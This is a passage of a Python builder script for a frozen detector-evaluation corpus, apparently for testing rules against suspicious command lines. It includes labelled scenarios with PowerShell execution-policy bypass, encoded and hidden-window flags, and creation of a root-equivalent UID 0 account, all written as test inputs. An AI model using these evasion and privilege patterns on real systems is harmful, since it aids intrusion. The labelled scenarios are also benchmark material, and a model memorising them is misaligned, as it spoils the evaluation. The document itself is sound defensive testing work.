        binding="wrong-host",
    )
    p.script(
        "holdout-context-binding-digest",
        "wrong-digest",
        False,
        '-File "C:\\Ops\\content-check.ps1"',
        [],
        "Authorized observed file has a different digest from the active indicator.",
        path=r"C:\Ops\content-check.ps1",
        hash_match=False,
    )
    p.script(
        "holdout-context-binding-digest",
        "no-intelligence",
        False,
        '-File "C:\\Ops\\new-release.ps1"',
        [],
        "Authorized release has a bound file observation but no indicator; observation alone is not a verdict.",
        path=r"C:\Ops\new-release.ps1",
        indicator="absent",
    )
    p.ps(
        "holdout-office-tail-boundary",
        "office-post-file-hidden",
        False,
        '-File "C:\\Ops\\mail-export.ps1" -WindowStyle Hidden',
        [],
        "Authorized mail export; Hidden appears only in the script parameters after File.",
        parent=OUTLOOK,
    )
    p.ps(
        "holdout-authorized-ambiguity",
        "authorized-encoded",
        False,
        "-OutputFormat XML -e " + encoded("authorized-holdout-recovery"),
        [2],
        "Authorized recovery command uses encoding without scoped approval; alert remains contract-correct.",
        observability="authorized-but-alertable",
    )
    p.uid(
        "holdout-authorized-ambiguity",
        "authorized-uid",
        False,
        "--non-unique --uid=000 rescue_clone",
        [5],
        "Authorized sandbox recovery account is root-equivalent; benign intent is not observable to the rule.",
        observability="authorized-but-alertable",
    )
    p.ps(
        "holdout-authorized-ambiguity",
        "authorized-office",
        False,
        '-ExecutionPolicy Bypass -File "C:\\Ops\\signed-report.ps1"',
        [8],
        "Authorized document automation uses bypass; a filename suggesting signing does not cancel the observable predicate.",
        parent=WORD,
        observability="authorized-but-alertable",
    )
    return p


def datasets():
    partitions = [development(), validation(), holdout()]
    all_ids, all_sessions, family_owners = set(), set(), {}
    result = {}
    for partition in partitions:
        rows = partition.rows
        assert len(rows) == 40
        assert Counter(row["suspicious"] for row in rows) == {True: 20, False: 20}
        assert Counter(row["observability"] for row in rows) == {
            "supported": 35,
            "unobservable": 2,
            "authorized-but-alertable": 3,
        }
        for row in rows:
            assert row["id"] not in all_ids and row["session_id"] not in all_sessions
            all_ids.add(row["id"])
            all_sessions.add(row["session_id"])
            family = row["origin_template"]
            assert family not in family_owners or family_owners[family] == partition.name
            family_owners[family] = partition.name
            # Rule expectations are independent from assigned intent, deliberately.
            assert row["expected_rule_ids"] or row["observability"] != "authorized-but-alertable"
        result[partition.name] = {
            "schema_version": 1,
            "name": "SentinelForge command semantics challenge",
            "version": "3.0.0",
            "partition": partition.name,
            "evaluation_time": CLOCK,
            "baseline_revision": BASELINE,
            "provenance": "Separately authored synthetic scenarios, never captured operational telemetry",
            "labeling_criteria": "Assigned action intent is explicit in reason; expected_rule_ids describe prespecified semantic contracts and need not agree with intent. Labels never enter telemetry.",
            "independence": "All partitions authored and frozen before v3 detector evaluation. Shared rule domains, constructor code and engineer authorship create correlation; this is not blinded, independent operational validation.",
            "selection_plan": {
                "scenarios": 40,
                "positive": 20,
                "negative": 20,
                "unobservable_positive": 2,
                "authorized_alertable_negative": 3,
                "chosen_before_target_results": True,
            },
            "scenarios": rows,
        }
    return result


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--check", action="store_true", help="Verify only; never create frozen files")
    args = parser.parse_args()
    generated = {name + ".json": serialized(data) for name, data in datasets().items()}
    manifest = {
        "version": "3.0.0",
        "frozen_date": "2026-11-16",
        "baseline_revision": BASELINE,
        "freeze_policy": "All partitions frozen together before any v3 outcome. No overwrite option; corrections require a new version and preserved original artifacts.",
        "files": {name: hashlib.sha256(raw).hexdigest() for name, raw in generated.items()},
        "builder_sha256": hashlib.sha256(Path(__file__).read_bytes()).hexdigest(),
        "plan_sha256": hashlib.sha256((ROOT / "docs/EVALUATION_V3.md").read_bytes()).hexdigest(),
        "selection_plan": {
            "partitions": 3,
            "per_partition": 40,
            "positive_per_partition": 20,
            "negative_per_partition": 20,
            "total_scenarios": 120,
        },
        "detector_executed_during_authoring": False,
        "scope": "Five selected command/context rule domains; no claim about complete rule coverage or field efficacy",
        "access_order": "Freeze all; development for tuning; validation for selection; freeze candidate; holdout once for report. Any reuse is development evidence thereafter.",
    }
    generated["manifest.json"] = serialized(manifest)
    existing = [name for name in generated if (DESTINATION / name).exists()]
    if existing:
        if len(existing) != len(generated):
            raise SystemExit("Refusing a partial frozen corpus; preserve artifacts and use a new version.")
        for name, raw in generated.items():
            if (DESTINATION / name).read_bytes() != raw:
                raise SystemExit(f"Frozen artifact mismatch: {name}; refusing overwrite.")
        print("Verified frozen v3: 120 scenarios, 20 positive/20 negative per split; no detector executed.")
        return
    if args.check:
        raise SystemExit("No frozen corpus exists; --check cannot create it.")
    DESTINATION.mkdir(parents=True, exist_ok=True)
    for name, raw in generated.items():
        # Exclusive creation adds a second guard against accidental overwrites/races.
        with (DESTINATION / name).open("xb") as output:
            output.write(raw)
    print("Frozen v3: 120 scenarios, 20 positive/20 negative per split; no detector executed.")


if __name__ == "__main__":
    main()
